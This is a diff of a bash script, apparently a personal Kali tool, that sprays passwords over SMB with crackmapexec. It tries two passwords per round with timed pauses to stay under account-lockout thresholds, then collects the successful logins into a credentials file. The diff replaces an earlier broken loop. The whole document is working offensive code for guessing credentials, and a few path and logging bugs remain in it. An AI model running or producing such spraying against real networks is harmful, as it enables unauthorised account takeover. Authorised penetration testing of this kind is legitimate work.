@@ -55,19 +55,30 @@ sleep 10
 
 #<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
-for pass in $(cat $3); dp
-	  crackmapexec smb $1 -u $2 -p $pass --log ~/Documents/sprays/spraygun.txt
-	  echo $pass > ~/Documents/sprays/used-passwords.txt
-	  echo "found creds: "
-	  cat ~/Documents/sprays/spraygun.txt | grep -ai '[+]' | tee -a ~/Documents/sprays/creds.txt
-	  sed -i "/$pass/d" $3
-	  $sleep-timer
+
+count=$(wc -l < $3)
+
+while [ $count -gt 0 ]; do
+	echo "Starting password spray with 2x every $5"
+	
+	head -n $count $3 > tmp.txt
+	
+	for pass in $(cat tmp.txt | head -2); do
+		
+		crackmapexec smb $1 -u $2 -p $pass --log /home/kali/Documents/sprays/spraygun.txt
+		echo $pass > /home/kali/Documents/sprays/used-passwords.txt
+
+		sleep 10
+
+	done
+	
+	echo "Found creds: "
+	cat /home/kali/Documents/sprays/spraygun.txt | grep -ai '[+]' | tee -a home/kali/Documents/sprays/creds.txt
+	
+	sed -i "1,2d" $3
+	
+	count=$(wc -l < $3)
+	$sleep_timer
 done
 
-
-### trying to figure out 2x each
-## not going well lol :(
-#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
-
-
+echo "End of file, check your creds!"
